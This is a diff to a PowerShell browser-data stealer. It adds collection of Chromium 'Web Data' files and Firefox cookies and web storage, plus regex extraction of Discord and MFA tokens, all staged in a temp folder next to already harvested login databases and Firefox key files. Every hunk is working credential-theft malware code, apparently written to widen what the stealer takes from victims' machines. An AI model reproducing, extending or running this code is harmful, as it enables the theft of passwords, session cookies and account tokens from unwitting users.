@@ -641,6 +641,7 @@ function chromiumBrowser {
 	)
 New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
 $localstate = "$path\User Data\Local State"
+$webdata = "$path\User Data\Web Data"
 $logindata = "$path\User Data\default\Login Data"
 $preferences = "$path\User Data\default\Preferences"
 $localstorage = "$path\User Data\default\Local Storage\leveldb"
@@ -665,6 +666,7 @@ foreach ($file in $log) {
 	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 }
 Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
+Copy-Item $webdata "$env:TMP\$FolderName\$Browser\Web Data"
 Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
 Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
 
@@ -679,6 +681,14 @@ New-Item -Path $env:tmp/$FolderName/Firefox -ItemType Directory
 echo $key4 > $env:TMP\$FolderName\Firefox\key4.db
 $logins = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include logins.json -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 echo $logins > $env:TMP\$FolderName\Firefox\logins.json
+$cookies = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include cookies.sqlite -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
+echo $cookies > $env:TMP\$FolderName\Firefox\cookies.sqlite
+$localstorage = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include webappsstore.sqlite -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
+echo $localstorage > $env:TMP\$FolderName\Firefox\webappsstore.sqlite
+$tokens = Get-Content "$env:TMP\$FolderName\Firefox\webappsstore.sqlite" | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
+echo $tokens >> "$env:TMP\$FolderName\Firefox\DiscordTokens.txt"
+$tokens2 = Get-Content "$env:TMP\$FolderName\Firefox\webappsstore.sqlite" | Select-String "mfa\.[\w-]{84}"
+echo $tokens2 >> "$env:TMP\$FolderName\Firefox\DiscordTokens.txt"
 }
 
 # Get Chrome Passwords
@@ -768,6 +778,8 @@ foreach ($file in $log) {
 	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
 	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 }
+$webdata = "$path\Default\Web Data"
+Copy-Item $webdata "$env:TMP\$FolderName\$Browser\Web Data"
 Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
 Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
 Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
@@ -820,6 +832,8 @@ foreach ($file in $log) {
 	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
 	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 }
+$webdata = "$path\Web Data"
+Copy-Item $webdata "$env:TMP\$FolderName\$Browser\Web Data"
 Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
 Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
 Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
@@ -858,6 +872,8 @@ foreach ($file in $log) {
 	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
 	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 }
+$webdata = "$path\Web Data"
+Copy-Item $webdata "$env:TMP\$FolderName\$Browser\Web Data"
 Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
 Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
 Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
